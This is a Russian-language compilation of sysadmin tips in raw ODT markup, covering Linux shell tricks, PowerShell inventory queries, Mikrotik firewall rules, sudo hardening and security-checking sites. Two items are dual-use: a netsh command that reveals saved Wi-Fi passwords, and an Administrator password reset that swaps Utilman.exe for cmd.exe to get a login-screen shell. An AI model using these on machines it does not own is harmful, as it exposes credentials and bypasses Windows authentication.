      <text:p text:style-name="P27">Как надо: Ctrl+R. Просто нажмите Ctrl+R и введите первые буквы нужной команды.</text:p>
      <text:p text:style-name="P27">Если поиск не выдал нужную команду сразу, то нажмите Ctrl+R еще раз. Повторное нажатие используется для прокрутки результатов. Ниже приведен поиск для cat. (reverse-i-search)cat: sudo cat /var/log/messages</text:p>
      <text:p text:style-name="P26">Переход в начальную директорию - cd. Вы не на шутку удивитесь, узнав, сколько людей не знают этого способа! cd. Да, так просто. Без лишних аргументов вы сразу попадете в начальную директорию.</text:p>
      <text:p text:style-name="P26">Возвращение в последнюю директорию - cd -. Иногда простой способ - самый лучший. Допустим, вы были в директории /var/www/foo, а теперь оказались в /etc . Простая команда cd - вернет вас обратно в /var/www/foo .</text:p>
      <text:p text:style-name="P26">Как не надо: cd /var/www/foo</text:p>
      <text:p text:style-name="P26">Как надо: cd -</text:p>
      <text:p text:style-name="P26">Контроль работы: передний план, фоновый режим и прочее. Возможно, вам потребуется какое-то время, чтобы привыкнуть, но оно того стоит. Допустим, вы редактируете файл в vim (вы же не будете этого делать в nano, да?!). И вот вам вдруг захотелось что-то найти в директории /var/www/html. Конечно же, вы можете выйти из vim, перейти в нужную директорию, а потом вдруг решить, что неплохо было бы вернуться к редактированию. Есть и другой вариант - перевести vim в фоновый режим и вернуться к нему позже. Напишите: Ctrl+Z. Эта комбинация переводит все текущие задачи с переднего плана в фоновый режим. Полезно как минимум для: less, cat, man, vim и т.д. «И куда же отправится моя активная задача?» - спросите вы. Напишите jobs и сами узнаете.</text:p>
      <text:p text:style-name="P26">user@host: jobs</text:p>
      <text:p text:style-name="P26">[1] Stopped vim</text:p>
      <text:p text:style-name="P28">Супер. Теперь можно заняться чем-то другим. А как только вы решите вернуться к задаче, напишите fg. Эта команда возвращает фоновую задачу (vim) на передний план. Обратите внимание, что фоновые процессы приостанавливаются. Поэтому если в файле вы выполняли что-то из разряда tail, то для завершения команды потребуется какое-то время. Если же в фоновом режиме запущено несколько задач, то напишите fg 3 , где 3 - это номер задачи для возобновления. Увидеть список задач можно по команде jobs.</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text:span text:style-name="T5">Сохранение вывода команды top с более чем одной итерацией из 5 итераций. Обычно программа работает непрерывно с задержкой в 2 секунды, и </text:span><text:soft-page-break/><text:span text:style-name="T5">вы можете изменить это значение, добавив в верхнюю команду значение ‘-d’, как показано ниже: top -n 5 -d 4 -b &gt;/backup/output_1.txt</text:span></text:p>
      <text:p text:style-name="P26">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7">-b : Работа в пакетном режиме (Запуск команды top в пакетном режиме для перенаправления вывода в другие программы или в файл)</text:p>
      <text:p text:style-name="P27">-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28">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26">Как посмотреть пароли от Wi-Fi к которым вы подключались (для Windows). ОС хранит данные про все Wi-Fi сети к которым вы подключились. Доступ к этой информации можно получить с помощью обычной командной строки. Инструкция:</text:p>
      <text:p text:style-name="P26">1. Открываем "CMD" от имени Администратора. </text:p>
      <text:p text:style-name="P26">2. Вводим команду netsh wlan show profiles (Будет выведены все сети, к которым вы подключались)</text:p>
      <text:p text:style-name="P26">3. Выбираем нужную и вводим netsh wlan show profile name="Имя_сети" key=clear</text:p>
      <text:p text:style-name="P26">"Имя сети" - название нужного Wi-Fi. Если имя сети состоит из двух слов, то возьмите их в кавычки. </text:p>
      <text:p text:style-name="P28">Система покажет всю информацию про эту сеть, в том числе и пароль.</text:p>
      <text:p text:style-name="P26">Stress – это инструмент командной строки Linux, который позволяет нагружать процессор, память, систему ввода-вывода и диск. Установим stress на CentOS, RHEL, Fedora: sudo dnf install stress</text:p>
      <text:p text:style-name="P26">Установим stress на Ubuntu и Debian: sudo apt install stress</text:p>
      <text:p text:style-name="P26">Синтаксис stress: stress [OPTION [ARG]]</text:p>
      <text:p text:style-name="P26">Увеличить нагрузку на процессор. Опция -c или –cpu использует заданное количество воркеров на функции sqrt(), чтобы увеличить нагрузку на процессор и заставить его работать интенсивнее: stress -c N или stress --cpu N</text:p>
      <text:p text:style-name="P26">Следующая команда будет непрерывно загружать 4 ядра процессора: stress --cpu 4</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Задаем тайм-аут для стресса. Чтобы задать работу на определенное время, вы можете использовать опцию -t или –timeout. Следующие команды будут нагружать четыре ядра процессора только в течение 10 с: stress -c 4 -t 10 или stress --cpu 4 --timeout 10</text:span></text:p>
      <text:p text:style-name="P26">Увеличение нагрузки на память. Опция -v или --vm позволяет вам нагрузить виртуальную память: [simterm] $ stress -v N</text:p>
      <text:p text:style-name="P26">Увеличение нагрузки ввода-вывода на диск. Вы можете увеличить нагрузку ввода-вывода с помощью опции -i или –io: stress -i N или stress --io N</text:p>
      <text:p text:style-name="P26">Создаем нагрузка на систему с помощью двух процессов, связанных с вводом-выводом: # stress --io 100</text:p>
      <text:p text:style-name="P27">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text:p>
      <text:p text:style-name="P27">Если вы выполните эту команду без каких-либо аргументов, то она покажет дисковые IO для всех доступных дисков: iostat -d /dev/vda -d /dev/vdb 1</text:p>
      <text:p text:style-name="P26">Увеличение нагрузки на диск. Опция -d или –hdd используется для создания нагрузки на диск: stress -d N или stress --hdd N</text:p>
      <text:p text:style-name="P26">Для увеличения нагрузки на диск мы используем следующую команду: stress --hdd 100</text:p>
      <text:p text:style-name="P26">Посмотрим пропускную способность диска с помощью команды vmstat: vmstat 1 100</text:p>
      <text:p text:style-name="P28">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 stress --cpu 4 --vm 2 --io 1 -t 20</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T5">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 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CheckSDRefDom - Проверяет правильность доменов ссылок дескрипторов безопасности для каждого раздела каталогов программ. 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 CrossRefValidation - Проверяет правильность перекрестных ссылок для доменов. RRSSysvol - проверяет состояние готовности для FRS SYSVOL. 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 FSMOCheck - Не проверяет роли хозяев операций, а вместо этого запрашивает сервер глобального каталога, первичный контроллер домена, </text:span><text:soft-page-break/><text:span text:style-name="T5">предпочтительный сервер времени, сервер времени и центр распространения ключей. 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 KCCEvent - Проверяет безошибочность создания объектов соединений для репликации между сайтами. KnowsOfRoleHolders - Проверяет возможность подключения контроллеров домена ко всем пяти хозяевам операций. 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 NCSecDesc - Проверяет правильность разрешений для репликации в дескрипторах безопасности для заголовков контекста именования. NetLogons - Проверяет правильность разрешений регистрации, позволяющих регистрацию, для каждого контроллера домена. ObjectsReplicated - Проверяет правильность репликации агента сервера каталогов и объектов учетных записей компьютеров. OutboundSecureChannels - Проверяется наличие безопасных каналов между всеми контроллерами домена в интересующем домене.</text:span></text:p>
      <text:p text:style-name="P27">Replications - Проверяет возможность репликации между контроллерами домена и сообщает обо всех ошибках при репликации. RidManager - Проверяет работоспособность и доступность хозяина относительных идентификаторов. Services - Проверяет работоспособность всех служб, необходимых для работы контроллера домена, на указанном контроллере домена. SystemLog - Проверяет безошибочность работы системного журнала. VerifyEnterpriseReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на всех контроллерах домена в лесу. VerifyReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на указанном контроллере домена. VerifyReplicas - Проверяет действительность всех разделов каталога приложения на всех серверах, принимающих участие в репликации. Синтаксис команды dcdiag: dcdiag /s:&lt;DomainController&gt; [/n:&lt;NamingContext&gt;] [[/u:&lt;domain\user&gt;] [/p:&lt;password&gt;] ] [{/a|/e}{/q|/v}] [/i] [/f:&lt;LogFile&gt;] [/ferr:&lt;ErrorLog&gt;] [/c [/skip:&lt;test]] [/test:&lt;test&gt;] [/fix]</text:p>
      <text:p text:style-name="P26">Работа с архивами:</text:p>
      <text:p text:style-name="P26">Создать .tar.gz:</text:p>
      <text:p text:style-name="P26">tar -czvf file.tar.gz /full/path - создать .tar.gz (архив)</text:p>
      <text:p text:style-name="P26">tar -cjvf file.tar.bz2 /full/path - создать .tar.bz2 (архив)</text:p>
      <text:p text:style-name="P26">Распаковать .tar: tar -xvf file.tar.gz</text:p>
      <text:p text:style-name="P26">Распаковать gz: gunzip yourfile.gz</text:p>
      <text:p text:style-name="P26">Распаковать многотомный архив: 7za x arch.7z.001</text:p>
      <text:p text:style-name="P26">Получить листинг файлов в архиве: tar -tf &lt;path_to_tarfile&gt;</text:p>
      <text:p text:style-name="P26">Извлечь конкретный файл из архива: tar -xf &lt;path_to_tarfile&gt; [&lt;file_1_in_archive&gt; &lt;file_2_in_archive&gt; ..]</text:p>
      <text:p text:style-name="P28">Скопировать файл на сервер: scp -P 12322 file.tar login@111.111.111.111:/home/user</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Сброс пароля Windows Server на примере пользователя Администратор/Administrator Windows Server 2012/2016:</text:span></text:p>
      <text:p text:style-name="P26">1 - Нам потребуется образ Windows Server 2016, Windows Server 2012. </text:p>
      <text:p text:style-name="P26">2 - Подключаемся к серверу через IPMI, либо KVM, загружаем образ в VirtualMedia.</text:p>
      <text:p text:style-name="P26">3 - После того, как образ был загружен, выполняем перезагрузку сервера. При загрузке ОС будет сообщение Press any key to boot from CD or DVD. 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p>
      <text:p text:style-name="P26">4 - В выборе действия нажимает Диагностика.</text:p>
      <text:p text:style-name="P26">5 - Далее выбираем Командная строка. Для начала необходимо найти системный диск, выполним команду: echo %windir%</text:p>
      <text:p text:style-name="P26">6 - Команда выведет системный диск. Переходим в него: C:</text:p>
      <text:p text:style-name="P26">7 - В случае, если диск C является системным. Далее переходим в System32: cd Windows\System32</text:p>
      <text:p text:style-name="P26">8 - Далее переименовываем Utilman.exe на Utilman.exe.old: ren Utilman.exe Utilman.exe.old</text:p>
      <text:p text:style-name="P27">9 - Выполняем замену cmd на Utilman.exe: copy cmd.exe Utilman.exe</text:p>
      <text:p text:style-name="P27">10 - После этого закрываем консоль и нажимаем кнопку Продолжить. После загрузки сервера появится экран ввода логина и пароля. Нажимаем Win + U и вводим следующую команду: net user Администратор new_password, где new_password -- новый пароль пользователя Администратор. В EN-локализации пользователь имеет названиме Administrator.</text:p>
      <text:p text:style-name="P26">Полезные команды Linux. Атрибуты файлов:</text:p>
      <text:p text:style-name="P26">chattr +a file - Разрешает только добавление данных в файл</text:p>
      <text:p text:style-name="P26">chattr +d file - Игнорировать данный файл при создании резервной копии с помощью программы dump</text:p>
      <text:p text:style-name="P26">chattr +c file - Разрешить ядру автоматически сжимать/разжимать содержимое файла</text:p>
      <text:p text:style-name="P26">chattr +i file1 - Защита файла от каких либо изменений или манипуляций: редактирование, перемещение, удаление, создание ссылок на него</text:p>
      <text:p text:style-name="P26">chattr +S file1 - Определяет, будет-ли при сохранении изменений, произведена синхронизация, как при использовании команды sync</text:p>
      <text:p text:style-name="P26">chattr +u file1 - При удалении файла с данным атрибутом, его будет сохранено, что-бы оставить пользователю возможность восстановить данные в случае необходимости</text:p>
      <text:p text:style-name="P26">chattr +s file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p>
      <text:p text:style-name="P28">lsattr - Листинг файлов с атрибутами</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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text:span><text:soft-page-break/><text:span text:style-name="T5">добавьте необязательный параметр Force. Например, эта команда отображает прямое содержимое диска C:PowerShell: Get-ChildItem -Path C:\ -Force. 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 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 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span></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7">if (Test-Path -Path $PROFILE) {</text:p>
      <text:p text:style-name="P27"><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 Можно также скопировать избранные элементы. Следующая команда копирует все .txt файлы, содержащиеся в любом месте в C:\dataC:\temp\text:</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T5">Copy-Item -Filter *.txt -Path c:\data -Recurse -Destination C:\temp\text. Вы по-прежнему можете выполнять собственные команды, такие как xcopy.exe и robocopy.exe копировать файлы. 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xt:span><text:soft-page-break/><text:span text:style-name="T5">\temp\New Folder' -ItemType Directory. Эта команда создает пустой файл C:\temp\New Folder\file.txt: New-Item -Path 'C:\temp\New Folder\file.txt' -ItemType File. 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 Если вам не нужно запрашивать каждый содержащийся элемент, укажите параметр Recurse: Remove-Item -Path C:\temp\DeleteMe -Recurse</text:span></text:p>
      <text:p text:style-name="P26">PowerShell скрипты для сбора информации о компьютерах:</text:p>
      <text:p text:style-name="P26">Собираем сведения о рабочих столах локального компьютера:Get-CimInstance -ClassName Win32_Desktop</text:p>
      <text:p text:style-name="P26">Вывод сведений о BIOS: Get-CimInstance -ClassName Win32_BIOS</text:p>
      <text:p text:style-name="P26">Вывод сведений о процессоре:</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property SystemType</text:p>
      <text:p text:style-name="P26">SystemType</text:p>
      <text:p text:style-name="P26">----------</text:p>
      <text:p text:style-name="P26">X86-based PC</text:p>
      <text:p text:style-name="P26">Получить данные поставщика вычислительной техники (OEM): Get-CimInstance -ClassName Win32_ComputerSystem</text:p>
      <text:p text:style-name="P26">Список установленных исправлений: Get-CimInstance -ClassName Win32_QuickFixEngineering</text:p>
      <text:p text:style-name="P27">Перечисление сведений о версии операционной системы:</text:p>
      <text:p text:style-name="P27">Get-CimInstance -ClassName Win32_OperatingSystem |</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Select-Object -Property BuildNumber,BuildType,OSType,ServicePackMajorVersion,ServicePackMinorVersion</text:p>
      <text:p text:style-name="P26">Общие сведения о локальных пользователях:</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_OperatingSystem |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Select-Object -Property NumberOfLicensedUsers, NumberOfUsers, RegisteredUser</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property *user*</text:p>
      <text:p text:style-name="P26">Получение доступного места на диске:</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Measure-Object -Property FreeSpace,Size -Sum |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Select-Object -Property Property,Sum</text:p>
      <text:p text:style-name="P26">Получение сведений о сеансе входа: Get-CimInstance -ClassName Win32_LogonSession</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Отобразить пользователя, вошедшего в определенную компьютерную систему: Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName</text:span></text:p>
      <text:p text:style-name="P26">Получение местного времени с компьютера: Get-CimInstance -ClassName Win32_LocalTime</text:p>
      <text:p text:style-name="P26">Отображение состояния службы:</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_Service |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Select-Object -Property Status,Name,DisplayName</text:p>
      <text:p text:style-name="P26">Get-CimInstance -ClassName Win32_Service |</text:p>
      <text:p text:style-name="P28"><text:s text:c="4"/>Format-Table -Property Status, Name, DisplayName -AutoSize -Wrap</text:p>
      <text:p text:style-name="P26">Лайфхаки по работе с формулами в Excel. В Excel есть множество удивительных лайфхаков для работы с формулами. Вот некоторые из них:</text:p>
      <text:p text:style-name="P26">1. Автозаполнение формул. Если нужно применить формулу к большому диапазону ячеек, вы можете использовать автозаполнение. Просто выделите ячейку с формулой, затем протяните за маленький квадратик в углу этой ячейки, чтобы скопировать формулу на другие ячейки.</text:p>
      <text:p text:style-name="P26">2. Использование абсолютных ссылок ($). Если вы хотите зафиксировать ссылку на определенную ячейку при копировании формулы, используйте символ «$». Например, если вы хотите зафиксировать столбец A, используйте «$A1» или «A$1», если хотите зафиксировать строку.</text:p>
      <text:p text:style-name="P28">3. Показать формулы. Можно выделить все ячейки с формулами на листе, чтобы проверить, где формулы, а где значения. В этом поможет команда «Найти и выделить» → «Формулы». В Google Таблицах используйте «Вид» → «Показать» → «Формулы».</text:p>
      <text:p text:style-name="P26">Подборка ChatGPT расширений для браузера. Часть 2:</text:p>
      <text:p text:style-name="P26">1. Gist AI <text:s/>(https://www.gistai.tech/?utm_source=tool_directory&amp;utm_medium=post&amp;utm_campaign=launch) - бесплатный саммерайзер для веб-сайтов, YouTube и PDF на базе ChatGPT;</text:p>
      <text:p text:style-name="P27">2. AI Character GPT (https://chromewebstore.google.com/detail/ai-character-for-gpt/daoeioifimkjegafelcaljboknjkkohh) - для создания ИИ-ботов в пару кликов на базе ChatGPT или Bard;</text:p>
      <text:p text:style-name="P27">3. ShareGPT (https://sharegpt.com/) - расширение, позволяющие делиться промтами с другими пользователями ИИ;</text:p>
      <text:p text:style-name="P26">4. AI Promt Genius (https://chromewebstore.google.com/detail/ai-prompt-genius/jjdnakkfjnnbbckhifcfchagnpofjffo) - для создания качественных промтов и улучшения существующих;</text:p>
      <text:p text:style-name="P28">5. WebChatGPT <text:s/>(https://chromewebstore.google.com/detail/webchatgpt-chatgpt-%D1%81-%D0%B4%D0%BE%D1%81%D1%82/lpfemeioodjbpieminkklglpmhlngfcn) - <text:s/>добавляет релевантные веб-результаты в ваши подсказки к ChatGPT для более точных и актуальных разговоров.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Сетевое администрирование: подборка полезного материала. Администрирование сетей - целый перечень мероприятий, нацеленный на </text:span><text:soft-page-break/><text:span text:style-name="T5">создание, настройку и поддержку корректной и постоянной работы производительности компьютерных сетей. Также оказание техподдержки пользователей, которые работают в одной сетевой группе. В этом посте подготовили для вас подборку материалов, состоящую из серии статей, практических разборов и др.</text:span></text:p>
      <text:p text:style-name="P26">1. Сетевые модели, часть 1. Эталонная сетевая модель OSI. (https://infocisco.ru/network_model_osi.html)</text:p>
      <text:p text:style-name="P26">2. Сетевые модели, часть 2. Сетевая модель TCP/IP или DOD. (https://infocisco.ru/network_model_tcpip.html)</text:p>
      <text:p text:style-name="P26">3. Сетевые модели, часть 3. Инкапсуляция, декапсуляция, данные, пакеты, фреймы, биты, PDU. (https://infocisco.ru/network_model_encapsulation_pdu.html)</text:p>
      <text:p text:style-name="P26">4. Сетевые устройства. Различие роутера от маршрутизатора, от моста, от коммутатора. (https://infocisco.ru/network_devices.html)</text:p>
      <text:p text:style-name="P26">5. Работа сетевых устройств, отражение работ на сетевой эталонной модели OSI. (https://infocisco.ru/works_network_devices.html)</text:p>
      <text:p text:style-name="P26">6. Базовая настройка маршрутизатора для выполнения лабораторных работ CCNA и ICND. Назначение IP-адресов на интерфейсы маршрутизатора. (https://infocisco.ru/cheatsheet_router_configuration_ip_to_interface.html)</text:p>
      <text:p text:style-name="P26">7. CCNA 3 на русском. Ответы, перевод, объяснения. (https://infocisco.ru/answers_ccna_3.html)</text:p>
      <text:p text:style-name="P26">8. Статическая маршрутизация. (https://infocisco.ru/cheatsheet_static_routing.html)</text:p>
      <text:p text:style-name="P26">9. Динамическая маршрутизация. Протокол RIPv2. (https://infocisco.ru/cheatsheet_dinamic_routing_protocol_rip.html)</text:p>
      <text:p text:style-name="P28">10. Cisco CCNA: Деление сети на подсети (PDF). Пример деления сети. (https://infocisco.ru/cs_subnetting.html)</text:p>
      <text:p text:style-name="P26">Онлайн инструменты проверки подозрительных писем, ссылок и файлов:</text:p>
      <text:p text:style-name="P26">1. phish.ly - анализирует е-мэйлы, проверяя URL-адреса и вложения внутри. Создает SHA256 и MD5-хэш для итогового файла со ссылкой на Virus Total. Просто отправьте подозрительное письмо на адрес scan@phish.ly и автоматический ответ будет содержать результаты проверки. </text:p>
      <text:p text:style-name="P27">2. Redirect Detective (https://redirectdetective.com/) - мощный анализатор ссылок, который может узнать куда перенаправляет короткая ссылка, какая партнерская сеть используется, проверяет на каком этапе переправления устанавливаются файлы cookie и т. д.</text:p>
      <text:p text:style-name="P27">3. Is Legit? <text:s/>(https://www.islegitsite.com/) - популярный анти-скам реестр среди зарубежных сайтов. Можно проверить сайт на предмет подозрительности. </text:p>
      <text:p text:style-name="P26">4. Hardenize (https://www.hardenize.com/) - выдает отчет безопасности по любому сайту: HTTPS, информация о домене, данные почты, протоколы и т.д.</text:p>
      <text:p text:style-name="P26">5. Virus Total <text:s/>(https://www.virustotal.com/gui/home/upload) - самый популярный он-лайн антивирус. Проверяет файлы и ссылки. </text:p>
      <text:p text:style-name="P26">6. MetaDefender Cloud - мощный анти-вирусный сканер файлов, ссылок, IP адресов, доменов и хешей. </text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">7.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span></text:p>
      <text:p text:style-name="P28">8.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text:p>
      <text:p text:style-name="P26">Определяем контент, созданный нейросетями:</text:p>
      <text:p text:style-name="P26">1. AI or Not (https://www.aiornot.com/) - определит картинку, видео или запись голоса;</text:p>
      <text:p text:style-name="P26">2. Content at Scale (https://contentatscale.ai/ai-image-detector/?fpr=ddiy&amp;fp_sid=aiiamgedetect) - определит картинку, сгенерированную ИИ;</text:p>
      <text:p text:style-name="P26">3. Illuminarty (https://illuminarty.ai/en/) - определяет картинку или текст посредством сравнительного анализа;</text:p>
      <text:p text:style-name="P26">4. V7 Deepfake Detector <text:s/>(https://www.v7labs.com/news/v7-releases-deep-fake-detector-for-chrome) - определяет дипфейки, можно запросить демо версию;</text:p>
      <text:p text:style-name="P26">5. AI Text Classifier (https://platform.openai.com/ai-text-classifier) - определяет текст, написанный моделями ChatGPT;</text:p>
      <text:p text:style-name="P26">6. GPTZero - определяет текст, написанный любыми популярными моделями;</text:p>
      <text:p text:style-name="P28">7. AI Content Detector (https://crossplag.com/ai-content-detector/) - сайт с говорящим названием, тоже определяет текст.</text:p>
      <text:p text:style-name="P26">Как защитить сервер Linux? Ограничьте, кто может использовать sudo. Почему: sudo позволяет учетным записям выполнять команды от имени других учетных записей, включая root. Мы хотим убедиться, что только нужные нам учетные записи могут использовать sudo. Цели: привилегии sudo ограничены теми, кто входит в указанную нами группу. Примечания. Возможно, ваша сборка уже сделала это, или у вас уже есть специальная группа, предназначенная для этой цели, поэтому сначала проверьте. Debian создаёт группу sudo. Чтобы просмотреть пользователей, которые входят в эту группу (таким образом, имеют привилегии sudo): cat /etc/group | grep "sudo". Шаги:</text:p>
      <text:p text:style-name="P26">1 - Создайте группу: sudo groupadd sudousers</text:p>
      <text:p text:style-name="P26">2 - Добавьте учетную запись(и) в группу:</text:p>
      <text:p text:style-name="P26">sudo usermod -a -G sudousers user1</text:p>
      <text:p text:style-name="P26">sudo usermod -a -G sudousers user2</text:p>
      <text:p text:style-name="P27">sudo usermod -a -G sudousers <text:s/>…</text:p>
      <text:p text:style-name="P27">Вам нужно будет сделать это для каждой учетной записи на вашем сервере, которой нужны привилегии sudo.</text:p>
      <text:p text:style-name="P26">3 - Создайте резервную копию файла конфигурации sudo /etc/sudoers: sudo cp --archive /etc/sudoers /etc/sudoers-COPY-$(date +"%Y%m%d%H%M%S")</text:p>
      <text:p text:style-name="P26">4 - Отредактируйте файл конфигурации sudo /etc/sudoers: sudo visudo</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T5">5 - Скажите sudo, чтобы только пользователи из группы sudousers могли использовать sudo, добавив эту строку, если ее еще нет: %sudousers <text:s text:c="2"/>ALL=(ALL:ALL) ALL</text:span></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text:p>
      <text:p text:style-name="P26">Задача: Организовать вход по ssh ключу с сервера server1 на server2 с правами root. Генерируем публичный открытый и закрытый ключи, под пользователем root на server1: ssh-keygen -t rsa</text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P26">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9">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Шпаргалка по фаерволу Mikrotik, пропускаем VPN соединения. 1. Разрешить весь VPN-трафик через VPN-соединения: Надо учитывать, что некоторые виды подключения, например GRE не являются PPP.</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add chain=forward comment="Permit all PPP" in-interface=all-ppp</text:p>
      <text:p text:style-name="P26">2. Разрешить PPTP-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add chain=input dst-port=1723 protocol=tcp comment="Permit PPTP"</text:p>
      <text:p text:style-name="P26">add action=accept chain=input protocol=gre comment="Permit GRE"</text:p>
      <text:p text:style-name="P26">3. Разрешить L2TP-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add chain=input dst-port=1701 protocol=udp comment="Permit L2TP"</text:p>
      <text:p text:style-name="P26">4. Разрешить IPSec-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add chain=input port=500,4500 protocol=udp comment="Permit IPSec ports 500 and 4500"</text:p>
      <text:p text:style-name="P26">add chain=input protocol=ipsec-esp comment="Permit IPSec protocol ipsec-esp"</text:p>
      <text:p text:style-name="P26">5. Разрешить OpenVPN-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input dst-port=1194 protocol=tcp comment="Permit OpenVPN"</text:p>
      <text:p text:style-name="P26">6. Разрешить SSTP-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input dst-port=443 protocol=tcp comment="Permit SSTP"</text:p>
      <text:p text:style-name="P26">7. Разрешить GRE-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input protocol=gre comment="Permit GRE"</text:p>
      <text:p text:style-name="P26">8. Разрешить IPIP-подключение</text:p>
      <text:p text:style-name="P26">/ip firewall filter</text:p>
      <text:p text:style-name="P26">add action=accept chain=input protocol=ipip comment="Permit IPIP"</text:p>
      <text:p text:style-name="P26">9. Прохождение IPSec при использовании Fast Track</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Fast Track это опция представленная в RouterOS 6.29. С помощью этой опции можно передавать пакеты в обход ядра Linux. За счет этого существенно </text:span><text:soft-page-break/><text:span text:style-name="T5">повышается производительность маршрутизатора. Включить Fast Track можно следующим образом:</text:span></text:p>
      <text:p text:style-name="P27">/ip firewall filter add chain=forward action=fasttrack-connection connection-state=established,related</text:p>
      <text:p text:style-name="P27">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 Как результат появляется недостаток: соединения IPsec так же не будут обработаны. Решить эту проблему можно следующим образом. Вначале надо пометить соединения IPsec:</text:p>
      <text:p text:style-name="P26">/ip firewall mangle</text:p>
      <text:p text:style-name="P26">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=out,ipsec new-connection-mark=ipsec</text:p>
      <text:p text:style-name="P26">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=in,ipsec new-connection-mark=ipsec</text:p>
      <text:p text:style-name="P26">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26">/ip firewall filter add action=fasttrack-connection chain=forward comment=FastTrack</text:p>
      <text:p text:style-name="P28">connection-mark=!ipsec connection-state=established,related</text:p>
      <text:p text:style-name="P26">Средства анализа и просмотра log-файлов:</text:p>
      <text:p text:style-name="P26">Alco (Apache Log Colorizing Tool) (https://www.linuxpages.org/) - Утилита для подсветки log-файлов web-сервера Apache. Написана на awk.</text:p>
      <text:p text:style-name="P26">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26">Logcheck (https://logcheck.org/) - Простая утилита для фильтрации log-файлов на «не обычные» записи (в.т.ч. и с помощью регулярных выражений) и отправки отчета на e-mail.</text:p>
      <text:p text:style-name="P26">LogMiner (https://logminer.sourceforge.net/) - Мощный анализатор log-файлов для Apache или другого web-сервера, использующего комбинированный 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p>
      <text:p text:style-name="P28">MultiTail (https://github.com/halturin/multitail) - Аналог утилиты tail, позволяющий показывать данные из файлов в нескольких окнах одной консоли. Основан на ncurses.</text:p>
      <text:p text:style-name="P26">Как найти количество открытых файлов в Linux? Значение сохраняется в: # cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P26">Проверка Hard лимит в Linux: # ulimit -Hn</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Проверка Soft лимит в Linux: # ulimit -Sn</text:span></text:p>
      <text:p text:style-name="P26">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26"># su root</text:p>
      <text:p text:style-name="P26">$ ulimit -Sn</text:p>
      <text:p text:style-name="P26">$ ulimit -Hn</text:p>
      <text:p text:style-name="P27">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text:p>
      <text:p text:style-name="P27">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 # sysctl -w fs.file-max=500000</text:p>
      <text:p text:style-name="P26">Вы можете проверить текущее значение для количества открытых файлов с помощью следующей команды: $ cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P26">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 # vi /etc/sysctl.conf</text:p>
      <text:p text:style-name="P26">Добавьте следующую команду: fs.file-max=500000</text:p>
      <text:p text:style-name="P26">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте: # cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P26">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 # sysctl -p</text:p>
      <text:p text:style-name="P26">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 # vi /etc/security/limits.conf</text:p>
      <text:p text:style-name="P26">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 &lt;domain&gt; &lt;type&gt; &lt;item&gt; &lt;value&gt;. Вот пример установки Soft и Hard лимитов для пользователя dimon:</text:p>
      <text:p text:style-name="P26">## Example hard limit for max opened files</text:p>
      <text:p text:style-name="P26">dimon hard nofile 4096</text:p>
      <text:p text:style-name="P26">## Example soft limit for max opened files</text:p>
      <text:p text:style-name="P28">dimon soft nofile 1024</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Подборка SQL-запросов для очистки данных. Удаляем дубликаты записей:</text:span></text:p>
      <text:p text:style-name="P26">DELETE FROM your_table</text:p>
      <text:p text:style-name="P26">WHERE rowid NOT IN (</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>SELECT MAX(rowid)</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>FROM your_table</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>GROUP BY column1, column2, ...</text:p>
      <text:p text:style-name="P26">);</text:p>
      <text:p text:style-name="P26">Удаляем строки с NULL-значениями:</text:p>
      <text:p text:style-name="P26">DELETE FROM your_table</text:p>
